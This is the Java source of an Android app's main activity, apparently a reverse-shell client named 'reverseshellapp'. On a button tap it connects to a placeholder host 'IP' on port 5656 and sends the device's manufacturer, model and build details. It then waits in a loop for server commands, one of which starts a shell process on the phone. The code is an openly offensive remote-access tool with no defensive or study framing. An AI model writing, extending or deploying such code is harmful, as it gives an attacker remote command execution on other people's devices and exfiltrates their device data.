package com.example.reverseshellapp;

import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private final Connection connection = new Connection();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        Button connectToHostBtn = findViewById(R.id.connect_btn);
        connectToHostBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            connection.startConnection("IP", 5656);
                            Log.i("Connection", "Connection started");
                            String sendConnectionInfoToServer = connection.printConnetionInfo();
                            connection.sendFromClient(sendConnectionInfoToServer);
                            while (true) {
                                executeBasedOnInput();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }
        });

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }

    public String deviceInfo() {
        String line = "────୨ৎ────────୨ৎ────────୨ৎ────────୨ৎ────\n";
        line += "Manufacturer: "+ Build.MANUFACTURER+"\n";
        line += "Version/Release: "+ Build.VERSION.RELEASE+"\n";
        line += "Product: "+ Build.PRODUCT+"\n";
        line += "Model: "+ Build.MODEL+"\n";
        line += "Brand: "+ Build.BRAND+"\n";
        line += "Device: "+ Build.DEVICE+"\n";
        line += "Host: "+ Build.HOST+"\n";
        line += "────୨ৎ────────୨ৎ────────୨ৎ────────୨ৎ────\n";
        return line;
    }

    public void executeBasedOnInput() throws IOException {
        String msgReceivedFromServer = connection.receiveFromServer();
        switch (msgReceivedFromServer) {
            case "1":
                connection.sendFromClient(deviceInfo());
                break;
            case "exit":
                connection.sendFromClient("Bye!");
                connection.stopConnection();
                break;
            case "2":
                connection.sendFromClient("꒷꒦꒷꒦꒷꒦꒷꒦꒷꒦꒷꒷꒦꒷꒦꒷꒦꒷꒦꒷꒦꒷SHELL STARTED꒷꒦꒷꒦꒷꒦꒷꒦꒷꒦꒷꒷꒦꒷꒦꒷꒦꒷꒦꒷꒦꒷");
                connection.shellProcess();
                break;
        }
    }
}
